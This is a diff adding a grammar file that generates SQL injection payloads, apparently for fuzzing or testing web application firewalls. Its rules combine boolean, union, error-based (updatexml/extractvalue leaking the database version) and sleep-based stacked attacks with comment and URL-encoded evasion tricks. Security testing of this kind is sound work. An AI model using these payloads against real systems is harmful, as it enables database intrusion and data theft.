@@ -1,0 +1,46 @@
+S:=numericContext \ sQuoteContext
+sQuoteContext:=terDigitZero terSQuote fuzzstr wsp booleanAttack wsp opOr terSQuote \ terDigitZero terSQuote opOr wsp fuzzequal wsp booleanAttack wsp opOr terSQuote \ terDigitZero terSQuote fuzzstr wsp sqliAttack cmt
+numericContext:=terDigitIncludingZero wsp booleanAttack wsp \ terDigitIncludingZero terSQuote wsp booleanAttack wsp opOr terSQuote terDigitZero \ terDigitIncludingZero wsp sqliAttack cmt
+sqliAttack:=unionAttack \ piggyAttack \ booleanAttack \ errorAttack
+errorAttack:=opAnd wsp errorfunction parOpen 1 opCom concat parOpen 0x7e opCom @@version opCom 0x7e par opCom 1 par
+errorfunction:=updatexml \ extractvalue
+piggyAttack:=opSem opSel wsp funcSleep
+unionAttack:=union wsp opSel wsp cols \ union wsp parOpen opSel wsp cols par
+cols:=terDigitZero
+booleanAttack:=orAttack \ andAttack
+orAttack:=opOr wsp booleanTrueExpr
+andAttack:=opAnd wsp booleanFalseExpr
+booleanFalseExpr:=unaryFalse
+unaryFalse:= opNot wsp trueAtom \ opNot opBinInvert falseAtom \ falseAtom
+falseAtom:=falseConst \  terDigitZero
+falseConst:=false
+booleanTrueExpr:=unaryTrue \ binaryTrue
+binaryTrue:=unaryTrue opEqual wsp parOpen unaryTrue par \ unaryFalse opEqual wsp parOpen unaryFalse par \ terSQuote terChar terSQuote opEqual terSQuote terChar terSQuote \ unaryFalse opLt parOpen unaryTrue par \ unaryTrue opGt parOpen unaryFalse par \ trueAtom wsp opLike wsp trueAtom \ unaryTrue wsp opIs wsp true \ unaryFalse wsp opIs wsp falseConst \ unaryTrue opMinus parOpen unaryFalse par
+unaryTrue:=trueAtom \ opNot wsp falseAtom \ opBinInvert wsp falseAtom \ opBinInvert wsp trueAtom
+trueAtom:=true \ 1 \ {a wsp 1}=1 \ {x wsp (select wsp 1)}=1 \ {`if` wsp 1}=1
+wsp:=blank 
+cmt:=-- blank \ %23
+blank:= + \ %0b
+par:=)
+funcSleep:=sleep parOpen terDigitExcludingZero par
+fuzzstr:= <@=1 \ <@!=1 \ <@=1. \ <@=.1 \ <@!=.1 \ <@!=1.
+fuzzequal:= 1<@ \ @<@ \ !@<@ \ !@<@. \ 1<@. \ @<@.
+parOpen:=(
+opSem:=;
+opSel:=select
+opAnd:=and \ &&
+opOr:=or \ ||
+opIs:=is
+opLike:=like
+opMinus:=-
+opCom:=, \ %2C
+opGt:=>
+opLt:=< \ %3C
+opEqual:==
+opBinInvert:=~ \ %7e
+opNot:=! \ not
+terChar:=a
+terDigitIncludingZero:=terDigitZero \ terDigitExcludingZero
+terDigitExcludingZero:=1 \ 2 \ 3 \ 4 \ 5 \ 6 \ 7 \ 8 \ 9
+terDigitZero:=0
+terSQuote:=' \ %27
